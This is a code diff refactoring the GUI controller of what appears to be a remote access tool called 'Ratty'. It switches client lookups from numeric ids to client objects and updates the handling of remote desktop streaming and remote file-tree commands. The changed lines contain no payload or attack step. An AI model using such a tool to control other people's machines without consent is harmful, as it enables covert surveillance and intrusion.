@@ -49,16 +49,6 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		gui.setController(this);
 	}
 	
-	private ServerClient getServerClient(final long id) {
-		for (final ServerClient client : clients) {
-			if (client.id == id) {
-				return client;
-			}
-		}
-		
-		return null;
-	}
-	
 	private ServerClient getServerClient(final ActiveClient client) {
 		for (final ServerClient serverClient : clients) {
 			if (serverClient.client == client) {
@@ -174,16 +164,14 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	private void handle(final ServerClient serverClient, final InformationPacket packet) {
-		final long id = serverClient.id;
 		final String name = packet.getName();
-		final String address = serverClient.client.getAddress();
 		final String os = packet.getOs();
 		final String version = packet.getVersion();
 		
 		serverClient.logIn(name, os, version);
 		serverClient.setController(this);
 		
-		gui.addTableRow(id, name, address, os, version);
+		gui.addRow(serverClient);
 	}
 	
 	@Override
@@ -221,14 +209,13 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	public void clientDisconnected(final ActiveClient client) {
 		final ServerClient serverClient = getServerClient(client);
 		final FileTreePanel treePanel = serverClient.getTreePanel();
-		final long id = serverClient.id;
 		
 		client.setObserver(null);
 		client.close();
 		clients.remove(client);
 		
 		treePanel.setVisible(false);
-		gui.removeTableRow(id);
+		gui.removeRow(serverClient);
 	}
 	
 	@Override
@@ -250,8 +237,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	
 	@Override
 	public void userInput(final String command) {
-		final long lastIdClicked = gui.getLastIdClicked();
-		final ServerClient serverClient = getServerClient(lastIdClicked);
+		final ServerClient serverClient = gui.getLastServerClientClicked();
 		final IPacket packet = getPacket(command, serverClient);
 		
 		if (packet != null) {
@@ -260,10 +246,10 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		
 		if (command == RattyGui.DESKTOP) {
 			serverClient.setStreamingDesktop(true);
-			gui.setStreaming(lastIdClicked, true);
+			gui.updateTable();
 		} else if (command == RattyGui.DESKTOP_STOP) {
 			serverClient.setStreamingDesktop(false);
-			gui.setStreaming(lastIdClicked, false);
+			gui.updateTable();
 		} else if (command == RattyGui.FILES) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
 			
